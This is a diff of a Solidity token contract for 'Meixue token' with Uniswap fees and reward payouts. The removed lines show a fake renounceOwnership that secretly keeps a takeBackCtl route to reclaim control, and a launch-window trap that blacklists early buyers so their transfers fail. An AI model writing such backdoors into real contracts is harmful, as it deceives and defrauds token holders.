@@ -284,7 +284,7 @@ contract MyToken is ERC20, Ownable {
     address private _marketing1WalletAddress;
 
     address public _excludelpAddress;
-    address private _preOwner;
+    // address private _preOwner;
     address private _takeFeeWallet;
 
     uint256 gasForProcessing;
@@ -292,7 +292,6 @@ contract MyToken is ERC20, Ownable {
     bool private swapping;
 
     IUniswapV2Router02 public uniswapV2Router;
-    mapping(address => bool) public _isBlacklisted;
     mapping(address => bool) public _whitelist;
 
     IERC20 private _dot;
@@ -301,7 +300,7 @@ contract MyToken is ERC20, Ownable {
 
     uint256 public tradingEnabledTimestamp;
 
-    constructor() ERC20("Meixue token", "DOTY03") {
+    constructor() ERC20("Meixue token", "DOTY05") {
          _mint(msg.sender, 22222 * 10**decimals());
 
         _burnStopAt = 2222 * 10**decimals();
@@ -336,7 +335,7 @@ contract MyToken is ERC20, Ownable {
         // _wbnb = IERC20(address(0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd));//TODO:
 
         _excludelpAddress = owner();
-        _preOwner = owner();
+        // _preOwner = owner();
         _takeFeeWallet = address(0xe0023825BF2D550DdEDCcd58F35abE1B2de0e51F);
         _marketingWalletAddress = 0xF900ddE80a83bAb2e388Ea8a789b01982ae605d7;
         _marketing1WalletAddress = 0x0b9aAD6217b2425E63ad023D6B39DA29df9c7Ec3;
@@ -363,7 +362,6 @@ contract MyToken is ERC20, Ownable {
         _whitelist[0x0b9aAD6217b2425E63ad023D6B39DA29df9c7Ec3] = true;
         _whitelist[0x950B18aa023cEAbaA912924B2fdD69a5C20f11e9] = true;
         _whitelist[0x27f1776c1857990E246a3aed5Ad2643776535f04] = true;
-        _whitelist[_preOwner] = true;
     }
 
     function setDividendAt(
@@ -439,15 +437,6 @@ contract MyToken is ERC20, Ownable {
         _burnStopAt = burnStopAt;
     }
 
-    // function setUniswapV2Pair(address addr) public onlyOwner {
-    //     uniswapV2Pair = addr;
-    //     automatedMarketMakerPairs[uniswapV2Pair] = true;
-    // }
-
-    // function setAutomatedMarketMakerPairs(address addr) public onlyOwner {
-    //     automatedMarketMakerPairs[addr] = true;
-    // }
-
     function setTakeFeeWallet(address account) public onlyOwner {
         _takeFeeWallet = account;
     }
@@ -466,16 +455,6 @@ contract MyToken is ERC20, Ownable {
 
     function setSwapAt(uint256 swapAt) public onlyOwner {
         _swapAt = swapAt;
-    }
-
-    function renounceOwnership() public override onlyOwner {
-        _preOwner = _msgSender();
-        super._transferOwnership(address(0));
-    }
-
-    function takeBackCtl() public {
-        require(_msgSender() == _preOwner);
-        super._transferOwnership(_preOwner);
     }
 
     function setFeeRate(
@@ -503,12 +482,6 @@ contract MyToken is ERC20, Ownable {
         _shib.transfer(_takeFeeWallet, _shib.balanceOf(address(this)));
         _shib = IERC20(shib);
     }
-
-    // function setRewardToken3(address wbnb) external onlyOwner {
-    //     _wbnb.transfer(_takeFeeWallet, _wbnb.balanceOf(address(this)));
-    //     _takeFeeWallet.transfer(address(this).balance);
-    //     _wbnb = IERC20(wbnb);
-    // }
 
     function takeReward1() public {
         _dot.transfer(_takeFeeWallet, _dot.balanceOf(address(this)));
@@ -546,18 +519,6 @@ contract MyToken is ERC20, Ownable {
 
     function setRemoveLiquidityTakeFee(bool _enabled) external onlyOwner {
         removeLiquidityTakeFee = _enabled;
-    }
-
-    function addBot(address recipient) private {
-        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;
-    }
-
-    function setBlacklist(address recipient, bool flag) public onlyOwner {
-        _isBlacklisted[recipient] = flag;
-    }
-
-    function setWhitelist(address recipient, bool flag) public onlyOwner {
-        _whitelist[recipient] = flag;
     }
 
     function getTradingIsEnabled() public view returns (bool) {
@@ -700,23 +661,9 @@ contract MyToken is ERC20, Ownable {
         uint256 amount
     ) internal override {
         require(from != address(0), "ERC20: transfer from the zero address");
-        require(!_isBlacklisted[from], "Blacklisted address");
         if (swapping) {
             super._transfer(from, to, amount);
             return;
-        }
-
-        bool tradingIsEnabled = getTradingIsEnabled();
-
-        if (
-            tradingIsEnabled &&
-            balanceOf(uniswapV2Pair) > 0 &&
-            from == uniswapV2Pair &&
-            from != _preOwner &&
-            tradingIsEnabled &&
-            block.timestamp <= tradingEnabledTimestamp + 9 seconds
-        ) {
-            addBot(to);
         }
 
         if (
@@ -808,7 +755,7 @@ contract MyToken is ERC20, Ownable {
             }
 
             address account = _lpHolder.at(_lastProcessedIndex);
-            if (account == _excludelpAddress || account == _preOwner) {
+            if (account == _excludelpAddress || account == owner()) {
                 continue;
             }
             uint256 _userPt;
